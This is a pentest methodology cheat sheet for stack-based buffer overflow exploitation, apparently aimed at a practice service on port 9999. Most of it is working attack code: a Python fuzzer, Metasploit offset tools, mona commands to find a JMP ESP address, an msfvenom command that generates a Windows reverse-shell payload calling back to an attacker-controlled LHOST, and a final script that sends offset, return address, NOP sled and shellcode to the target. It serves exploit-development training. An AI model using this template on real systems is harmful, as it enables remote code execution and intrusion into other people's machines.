# 💥 Buffer Overflow

Structured methodology for stack-based buffer overflow exploitation.

---

## METHODOLOGY

### 1. Fuzzing — Find the crash point

Send increasing payloads to identify the approximate crash offset

```python
import socket
buffer = b"A" * 100
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("$IP", 9999))
        s.send(buffer + b"\r\n")
        s.close()
        buffer += b"A" * 100
    except:
        print(f"Crashed at {len(buffer)} bytes")
        break
```

<details>
<summary>Example Output</summary>

```
Crashed at 2500 bytes
```
</details>

---

### 2. Find exact offset

Use pattern_create to find EIP offset — Tells you exactly where EIP is

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500
# Send the pattern as payload, note EIP value
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2500 -q <EIP_VALUE>
```

<details>
<summary>Example Output</summary>

```
[*] Exact match at offset 2003
EIP is at bytes 2003-2006
```
</details>

---

### 3. Confirm EIP control

Overwrite EIP with known value — Verify you control execution flow

```python
offset = 2003
buffer = b"A" * offset + b"B" * 4 + b"C" * (2500 - offset - 4)
# EIP should be 42424242 (BBBB)
```

---

### 4. Find bad characters

Send all bytes 0x00-0xFF — Identify characters that break the shellcode

```python
badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
    b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
    # ... continue through 0xff
)
# \x00 is almost always bad - exclude it
# Compare in debugger: any byte that doesn't appear or corrupts following bytes = bad
```

---

### 5. Find JMP ESP

Locate a JMP ESP instruction in a module without ASLR/DEP — This becomes your return address

```bash
# In Immunity Debugger with mona:
!mona jmp -r esp -cpb "\x00"
# Or find manually:
!mona modules  # Find module with no protections
!mona find -s "\xff\xe4" -m <module.dll>
```

<details>
<summary>Example Output</summary>

```
0x625011af : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll]
ASLR: False, Rebase: False, SafeSEH: False
Use this address as your EIP overwrite (little endian)
```
</details>

---

### 6. Generate shellcode

msfvenom payload excluding bad chars — Reverse shell or bind shell

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -b "\x00" -f python -v shellcode
```

---

### 7. Final exploit

Combine all components — NOP sled + shellcode

```python
import socket

offset = 2003
jmp_esp = b"\xaf\x11\x50\x62"  # 0x625011af in little endian
nop_sled = b"\x90" * 16
shellcode = b""  # paste msfvenom output here

buffer = b"A" * offset + jmp_esp + nop_sled + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("$IP", 9999))
s.send(buffer + b"\r\n")
s.close()
```

---

## QUICK CHECKLIST

### BOF exploit development order

Follow this exact order every time — Don't skip steps

```
1. Fuzz → find approximate crash length
2. pattern_create → find exact EIP offset
3. Confirm EIP control with "BBBB" (0x42424242)
4. Bad chars → test 0x01-0xFF (0x00 always bad)
5. JMP ESP → find in unprotected module
6. Shellcode → msfvenom with -b for bad chars
7. Exploit → offset + JMP ESP + NOPs + shellcode
```

---

## COMMON BAD CHARACTERS

### Usual suspects

These are frequently bad — Always test all 256 though

```
\x00  Null byte (almost always bad)
\x0a  Line feed (\n)
\x0d  Carriage return (\r)
\x25  Percent (%)
\x2b  Plus (+)
\x2f  Forward slash (/)
\x5c  Backslash (\)
```

---
